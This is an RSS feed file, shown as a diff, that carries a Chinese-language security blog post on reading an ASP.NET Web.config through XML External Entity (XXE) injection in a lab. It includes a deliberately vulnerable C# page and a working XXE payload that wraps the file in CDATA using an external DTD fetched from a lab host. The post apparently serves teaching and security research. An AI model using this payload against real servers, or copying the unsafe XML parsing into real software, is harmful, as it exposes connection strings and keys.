@@ -1,0 +1,109 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>cyku.tw – ASP.NET</title><link>https://cyku.tw/tags/asp.net/</link><description>Recent content in ASP.NET on cyku.tw</description><generator>Hugo -- gohugo.io</generator><language>zh-TW</language><lastBuildDate>Sat, 18 Aug 2018 02:16:11 +0800</lastBuildDate><atom:link href="https://cyku.tw/tags/asp.net/index.xml" rel="self" type="application/rss+xml"/><item><title>ASP.NET 下利用 XXE 讀取 Web.config</title><link>https://cyku.tw/blog/xxe-read-web-config-on-asp-net/</link><pubDate>Sat, 18 Aug 2018 02:16:11 +0800</pubDate><guid>https://cyku.tw/blog/xxe-read-web-config-on-asp-net/</guid><description>
+&lt;p&gt;XXE (XML External Entity Injection) 是個對 Server 端很強力的攻擊手法，可以進而實現 Server-Side Request Forgery、Arbitrary File Read 的利用。雖然可以利用 XXE 讀取一些較簡單的私密的 config、key 檔案，但若想讀取內含 XML 使用的特殊字元 (例如: &lt;code&gt;&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;lt;&lt;/code&gt;) 的檔案，就會產生一些問題。今天分享其中一個如何利用 XXE 讀取 Web.config 的小技巧。&lt;/p&gt;
+&lt;p&gt;在 ASP.NET 的環境下，Web.config 是用來控制針對 ASP.NET Application 設定的重要檔案，內容通常都含有極為重要的資訊，比如可能會存放對資料庫的 Connection String、傳輸時加解密所使用的 Key，而 Web.config 內容是採用 XML 的格式。&lt;/p&gt;
+&lt;p&gt;接下來的測試都會使用下面一個簡單的 Web.config:&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&amp;lt;configuration&amp;gt;
+&amp;lt;appSettings/&amp;gt;
+&amp;lt;connectionStrings/&amp;gt;
+&amp;lt;system.web&amp;gt;
+&amp;lt;compilation debug=&amp;#34;true&amp;#34;/&amp;gt;
+&amp;lt;customErrors mode=&amp;#34;Off&amp;#34; /&amp;gt;
+&amp;lt;pages validateRequest=&amp;#34;false&amp;#34; /&amp;gt;
+&amp;lt;httpRuntime requestValidationMode=&amp;#34;2.0&amp;#34; /&amp;gt;
+&amp;lt;/system.web&amp;gt;
+&amp;lt;!-- I am comment --&amp;gt;
+&amp;lt;/configuration&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;從上面可以看出，Web.config 就是一個標準的 XML 格式，若想使用一般的 XXE Payload 去讀取就可能產生問題，會得不到預期的結果。&lt;/p&gt;
+&lt;p&gt;接下來的測試環境都會使用下面一個簡單、粗糙的 ASP.NET 程式進行測試。&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-csharp" data-lang="csharp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;%&lt;span style="color:#960050;background-color:#1e0010"&gt;@&lt;/span&gt; Page Language=&lt;span style="color:#e6db74"&gt;&amp;#34;C#&amp;#34;&lt;/span&gt;%&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;%&lt;span style="color:#960050;background-color:#1e0010"&gt;@&lt;/span&gt; Import Namespace=&lt;span style="color:#e6db74"&gt;&amp;#34;System&amp;#34;&lt;/span&gt; %&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;%&lt;span style="color:#960050;background-color:#1e0010"&gt;@&lt;/span&gt; Import Namespace=&lt;span style="color:#e6db74"&gt;&amp;#34;System.Xml&amp;#34;&lt;/span&gt; %&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;%
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; XmlDocument doc = &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; XmlDocument();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; String data = Request.Params[&lt;span style="color:#e6db74"&gt;&amp;#34;data&amp;#34;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; doc.LoadXml(data);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; XmlNode node = doc.SelectSingleNode(&lt;span style="color:#e6db74"&gt;&amp;#34;/root/name&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Response.Write(node.InnerText);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;%&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;這個程式很單純地將傳入的 data 參數內容丟入 XmlDocument 作解析，再將 &lt;code&gt;&amp;lt;root /&amp;gt;&lt;/code&gt; 元素下的 &lt;code&gt;&amp;lt;name /&amp;gt;&lt;/code&gt; 的文字資料吐出來，未禁止 External Entity。&lt;/p&gt;
+&lt;p&gt;首先嘗試利用 External Entity 讀取 &lt;code&gt;C:\Windows\win.ini&lt;/code&gt;，因為是簡單的文字檔案，很順利地讀取成功。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2018/08/asp_xxe_01.png" alt="asp_xxe_01" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;接著嘗試讀取 &lt;code&gt;C:\inetpub\wwwroot\Web.config&lt;/code&gt;，看起來能正常讀取，但卻沒有內容。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2018/08/asp_xxe_02.png" alt="asp_xxe_02" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;原因出在輸出 &lt;code&gt;&amp;lt;name /&amp;gt;&lt;/code&gt; 的內容時是使用 &lt;code&gt;node.InnerText&lt;/code&gt;，即使我們成功引入 Web.config，但資訊都是放置在各個 Element 的 Attributes 中，而 InnerText 僅會輸出文字資料，並不包含 Element 本身的 Tag name 和 Attributes。&lt;/p&gt;
+&lt;p&gt;此時就可以利用 XML 中的 CDATA Section 將 Web.config 完整地讀取出來。在 CDATA Section 中，XML 解析器不會嘗試將 &lt;code&gt;&amp;lt;&lt;/code&gt;、&lt;code&gt;&amp;gt;&lt;/code&gt; 等字元作解析，會當作純粹的文字資料。&lt;/p&gt;
+&lt;p&gt;試著在 CDATA 中嵌入 &lt;code&gt;&amp;lt;&lt;/code&gt;、&lt;code&gt;&amp;gt;&lt;/code&gt; 字元，可以看到 &lt;code&gt;&amp;lt;foo&amp;gt;bar&amp;lt;/foo&amp;gt;&lt;/code&gt; 被完整地輸出了。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2018/08/asp_xxe_03.png" alt="asp_xxe_03" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;但若想直接在 CDATA Section 內引用 Entity 是不行的，因為不會解析。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2018/08/asp_xxe_04.png" alt="asp_xxe_04" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;所以需要利用 Parameter Entity 將資料與 CDATA Section 的頭尾拼接放入另一個 Entity，再引入該 Entity 才能夠順利輸出。&lt;/p&gt;
+&lt;p&gt;data 參數輸入:&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&amp;lt;!DOCTYPE root [
+&amp;lt;!ENTITY % start &amp;#34;&amp;lt;![CDATA[&amp;#34;&amp;gt;
+&amp;lt;!ENTITY % file PUBLIC &amp;#34;data&amp;#34; &amp;#34;file://C:\inetpub\wwwroot\Web.config&amp;#34;&amp;gt;
+&amp;lt;!ENTITY % end &amp;#34;]]&amp;gt;&amp;#34;&amp;gt;
+&amp;lt;!ENTITY % dtd SYSTEM &amp;#34;http://192.168.56.1/external.dtd&amp;#34;&amp;gt;
+%dtd;
+]&amp;gt;&amp;lt;root&amp;gt;&amp;lt;name&amp;gt;&amp;amp;all;&amp;lt;/name&amp;gt;&amp;lt;/root&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;要引入的 &lt;code&gt;http://192.168.56.1/external.dtd&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;!ENTITY all &amp;#34;%start;%file;%end;&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;上述 Payload 發生的事情是 &lt;code&gt;%dtd;&lt;/code&gt; 會先嘗試引入 external.dtd 文件，在 external.dtd 文件中分別又會引入 Parameter Entity &lt;code&gt;%start;&lt;/code&gt;、&lt;code&gt;%file;&lt;/code&gt;、&lt;code&gt;%end;&lt;/code&gt; 去構造出 &lt;code&gt;all&lt;/code&gt; Entity 的值，最後在原本的 XML 裡面 &lt;code&gt;&amp;amp;all;&lt;/code&gt; 就能引用到由 CDATA Section 包夾起來的 Web.config 的純文字資料。&lt;/p&gt;
+&lt;p&gt;成功讀取到完整的 Web.config，連同註解的內容都能看得到。&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2018/08/asp_xxe_05.png" alt="asp_xxe_05" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;針對 XXE 的利用技巧還有許多種，本篇分享的是我個人認為還算挺有趣的一個技巧，有興趣想了解更多的人可以參考下方 References 的連結。&lt;/p&gt;
+&lt;h3&gt;References:&lt;span class="hx:absolute hx:-mt-20" id="references"&gt;&lt;/span&gt;
+&lt;a href="#references" class="subheading-anchor" aria-label="此章節的永久連結"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://gist.github.com/staaldraad/01415b990939494879b4"target="_blank" rel="noopener"&gt;https://gist.github.com/staaldraad/01415b990939494879b4&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.acunetix.com/blog/articles/xml-external-entity-xxe-limitations/"target="_blank" rel="noopener"&gt;https://www.acunetix.com/blog/articles/xml-external-entity-xxe-limitations/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-3.5/ms256483%28v%3dvs.90%29"target="_blank" rel="noopener"&gt;https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-3.5/ms256483(v%3Dvs.90)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description></item></channel></rss>
